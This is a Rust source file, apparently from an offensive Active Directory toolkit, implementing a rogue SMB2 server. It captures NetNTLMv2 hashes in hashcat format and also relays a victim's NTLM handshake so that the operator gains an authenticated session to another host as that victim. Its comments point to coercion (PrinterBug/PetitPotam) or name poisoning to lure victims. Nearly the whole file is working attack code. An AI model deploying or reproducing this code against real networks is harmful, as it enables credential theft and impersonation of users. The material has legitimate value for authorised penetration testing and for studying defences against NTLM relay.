//! Minimal SMB2 server that captures NetNTLMv2 — the Responder/ntlmrelayx capture side.
//! It speaks just enough SMB2 to make a client complete an NTLM auth: NEGOTIATE →
//! SESSION_SETUP (challenge with the fixed server challenge) → SESSION_SETUP (grab the
//! AUTHENTICATE). Pair it with coercion (PrinterBug/PetitPotam) or name poisoning; the
//! captured hash is hashcat -m 5600. It never grants access — auth is rejected after capture.

use crate::header::cmd;
use crate::{spnego, Result, SmbError};
use adhammer_ntlm::{build_challenge, netntlmv2_from_type3, CAPTURE_CHALLENGE};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

const STATUS_SUCCESS: u32 = 0x0000_0000;
const STATUS_MORE_PROCESSING_REQUIRED: u32 = 0xC000_0016;
const STATUS_ACCESS_DENIED: u32 = 0xC000_0022;
const FLAGS_SERVER_TO_REDIR: u32 = 0x0000_0001;

/// Build a 64-byte SMB2 response header echoing the request's command/message id.
fn response_header(command: u16, message_id: u64, status: u32, session_id: u64) -> Vec<u8> {
    let mut h = vec![0u8; 64];
    h[0..4].copy_from_slice(&[0xfe, b'S', b'M', b'B']);
    h[4..6].copy_from_slice(&64u16.to_le_bytes()); // StructureSize
    h[8..12].copy_from_slice(&status.to_le_bytes());
    h[12..14].copy_from_slice(&command.to_le_bytes());
    h[14..16].copy_from_slice(&1u16.to_le_bytes()); // CreditResponse
    h[16..20].copy_from_slice(&FLAGS_SERVER_TO_REDIR.to_le_bytes());
    h[24..32].copy_from_slice(&message_id.to_le_bytes());
    h[40..48].copy_from_slice(&session_id.to_le_bytes());
    h
}

fn negotiate_response() -> Vec<u8> {
    let mut b = Vec::new();
    b.extend_from_slice(&65u16.to_le_bytes()); // StructureSize
    b.extend_from_slice(&0x0001u16.to_le_bytes()); // SecurityMode = SIGNING_ENABLED
    b.extend_from_slice(&0x0210u16.to_le_bytes()); // DialectRevision 2.1.0
    b.extend_from_slice(&0u16.to_le_bytes()); // Reserved
    b.extend_from_slice(&[0x11u8; 16]); // ServerGuid
    b.extend_from_slice(&0u32.to_le_bytes()); // Capabilities
    b.extend_from_slice(&0x0010_0000u32.to_le_bytes()); // MaxTransactSize
    b.extend_from_slice(&0x0010_0000u32.to_le_bytes()); // MaxReadSize
    b.extend_from_slice(&0x0010_0000u32.to_le_bytes()); // MaxWriteSize
    b.extend_from_slice(&0u64.to_le_bytes()); // SystemTime
    b.extend_from_slice(&0u64.to_le_bytes()); // ServerStartTime
    b.extend_from_slice(&(64u16 + 64).to_le_bytes()); // SecurityBufferOffset (header + body)
    b.extend_from_slice(&0u16.to_le_bytes()); // SecurityBufferLength = 0 (client initiates SPNEGO)
    b.extend_from_slice(&0u32.to_le_bytes()); // NegotiateContextOffset
    b
}

/// SESSION_SETUP response carrying a security buffer (the SPNEGO challenge).
fn session_setup_response(sec: &[u8]) -> Vec<u8> {
    let mut b = Vec::new();
    b.extend_from_slice(&9u16.to_le_bytes()); // StructureSize
    b.extend_from_slice(&0u16.to_le_bytes()); // SessionFlags
    b.extend_from_slice(&(64u16 + 8).to_le_bytes()); // SecurityBufferOffset
    b.extend_from_slice(&(sec.len() as u16).to_le_bytes()); // SecurityBufferLength
    b.extend_from_slice(sec);
    b
}

/// The request SESSION_SETUP security buffer: offset(2)@byte12 of the body, length(2)@14.
fn request_sec_buffer(msg: &[u8]) -> Option<&[u8]> {
    let off = u16::from_le_bytes([*msg.get(76)?, *msg.get(77)?]) as usize; // 64 + 12
    let len = u16::from_le_bytes([*msg.get(78)?, *msg.get(79)?]) as usize; // 64 + 14
    msg.get(off..off + len)
}

async fn send(stream: &mut TcpStream, pdu: &[u8]) -> Result<()> {
    let mut framed = (pdu.len() as u32).to_be_bytes().to_vec(); // NBSS length prefix
    framed.extend_from_slice(pdu);
    stream.write_all(&framed).await?;
    Ok(())
}

async fn recv(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut len = [0u8; 4];
    stream.read_exact(&mut len).await?;
    let n = u32::from_be_bytes(len) as usize & 0x00ff_ffff;
    let mut buf = vec![0u8; n];
    stream.read_exact(&mut buf).await?;
    Ok(buf)
}

/// Handle one client to the point of capture. Returns the hashcat 5600 line, if captured.
async fn handle(mut stream: TcpStream) -> Result<Option<String>> {
    loop {
        let msg = match recv(&mut stream).await {
            Ok(m) if m.len() >= 64 && &m[0..4] == [0xfe, b'S', b'M', b'B'] => m,
            _ => return Ok(None),
        };
        let command = u16::from_le_bytes([msg[12], msg[13]]);
        let message_id = u64::from_le_bytes(msg[24..32].try_into().unwrap());
        let session_id = u64::from_le_bytes(msg[40..48].try_into().unwrap());

        match command {
            cmd::NEGOTIATE => {
                let mut pdu = response_header(cmd::NEGOTIATE, message_id, STATUS_SUCCESS, 0);
                pdu.extend(negotiate_response());
                send(&mut stream, &pdu).await?;
            }
            cmd::SESSION_SETUP => {
                let sec = request_sec_buffer(&msg).ok_or(SmbError::Truncated)?;
                let ntlm = spnego::find_ntlm(sec).ok_or(SmbError::BadToken)?;
                let mtype = u32::from_le_bytes([ntlm[8], ntlm[9], ntlm[10], ntlm[11]]);
                if mtype == 1 {
                    // Type 1 → reply MORE_PROCESSING_REQUIRED with our CHALLENGE (Type 2).
                    let type2 = build_challenge(&CAPTURE_CHALLENGE, "ADHAMMER");
                    let token = spnego::challenge_resp(&type2);
                    let sid = if session_id == 0 { 0x1111_0000_0000_0001 } else { session_id };
                    let mut pdu = response_header(cmd::SESSION_SETUP, message_id, STATUS_MORE_PROCESSING_REQUIRED, sid);
                    pdu.extend(session_setup_response(&token));
                    send(&mut stream, &pdu).await?;
                } else if mtype == 3 {
                    // Type 3 → capture, then reject (never grant a session).
                    let captured = netntlmv2_from_type3(ntlm, &CAPTURE_CHALLENGE);
                    let mut pdu = response_header(cmd::SESSION_SETUP, message_id, STATUS_ACCESS_DENIED, session_id);
                    pdu.extend(session_setup_response(&[]));
                    let _ = send(&mut stream, &pdu).await;
                    return Ok(captured);
                }
            }
            _ => return Ok(None),
        }
    }
}

/// One inbound SMB client being **relayed**: instead of answering the NTLM challenge with our
/// own fixed value (capture), we hand the victim's Type1 out to the caller, relay back the
/// *target's* Type2, and surrender the victim's Type3 — so the caller can complete an
/// authenticated session to a third-party target as the victim.
pub struct RelayConn {
    stream: TcpStream,
    ss1_msg_id: u64,
    session_id: u64,
}

impl RelayConn {
    pub fn new(stream: TcpStream) -> Self {
        RelayConn { stream, ss1_msg_id: 0, session_id: 0 }
    }

    /// Handle NEGOTIATE and the first SESSION_SETUP; return the victim's NTLM Type1.
    pub async fn recv_type1(&mut self) -> Result<Vec<u8>> {
        loop {
            let msg = recv(&mut self.stream).await?;
            if msg.len() < 64 || msg[0..4] != [0xfe, b'S', b'M', b'B'] {
                return Err(SmbError::BadProtocol);
            }
            let command = u16::from_le_bytes([msg[12], msg[13]]);
            let message_id = u64::from_le_bytes(msg[24..32].try_into().unwrap());
            match command {
                cmd::NEGOTIATE => {
                    let mut pdu = response_header(cmd::NEGOTIATE, message_id, STATUS_SUCCESS, 0);
                    pdu.extend(negotiate_response());
                    send(&mut self.stream, &pdu).await?;
                }
                cmd::SESSION_SETUP => {
                    let sec = request_sec_buffer(&msg).ok_or(SmbError::Truncated)?;
                    let ntlm = spnego::find_ntlm(sec).ok_or(SmbError::BadToken)?;
                    self.ss1_msg_id = message_id;
                    self.session_id = 0x2222_0000_0000_0001;
                    return Ok(ntlm.to_vec());
                }
                _ => return Err(SmbError::BadToken),
            }
        }
    }

    /// Relay the target's Type2 challenge back to the victim.
    pub async fn send_challenge(&mut self, type2: &[u8]) -> Result<()> {
        let token = spnego::challenge_resp(type2);
        let mut pdu = response_header(cmd::SESSION_SETUP, self.ss1_msg_id, STATUS_MORE_PROCESSING_REQUIRED, self.session_id);
        pdu.extend(session_setup_response(&token));
        send(&mut self.stream, &pdu).await
    }

    /// Receive the victim's Type3 (computed over the target's challenge).
    pub async fn recv_type3(&mut self) -> Result<Vec<u8>> {
        let msg = recv(&mut self.stream).await?;
        let sec = request_sec_buffer(&msg).ok_or(SmbError::Truncated)?;
        let msg_id = u64::from_le_bytes(msg[24..32].try_into().unwrap());
        // Acknowledge so the victim's stack is satisfied; then it's the target's session we use.
        let mut pdu = response_header(cmd::SESSION_SETUP, msg_id, STATUS_ACCESS_DENIED, self.session_id);
        pdu.extend(session_setup_response(&[]));
        let _ = send(&mut self.stream, &pdu).await;
        spnego::find_ntlm(sec).map(|t| t.to_vec()).ok_or(SmbError::BadToken)
    }

    /// Bind a listener for relaying; returns accepted [`RelayConn`]s via the closure.
    pub async fn listen(addr: &str) -> Result<TcpListener> {
        Ok(TcpListener::bind(addr).await?)
    }
}

/// Listen on `addr` and print each captured NetNTLMv2 (dedup by account). Runs until Ctrl-C.
pub async fn capture(addr: &str) -> Result<()> {
    let listener = TcpListener::bind(addr).await?;
    println!("[*] SMB capture listener on {addr} — coerce or poison a victim toward this host");
    let seen = std::sync::Arc::new(tokio::sync::Mutex::new(std::collections::HashSet::new()));
    loop {
        let (stream, peer) = listener.accept().await?;
        let seen = seen.clone();
        tokio::spawn(async move {
            if let Ok(Some(line)) = handle(stream).await {
                let account = line.split(':').take(3).collect::<Vec<_>>().join("\\");
                if seen.lock().await.insert(account.clone()) {
                    println!("[+] NetNTLMv2 from {peer} ({account}):");
                    println!("{line}");
                }
            }
        });
    }
}
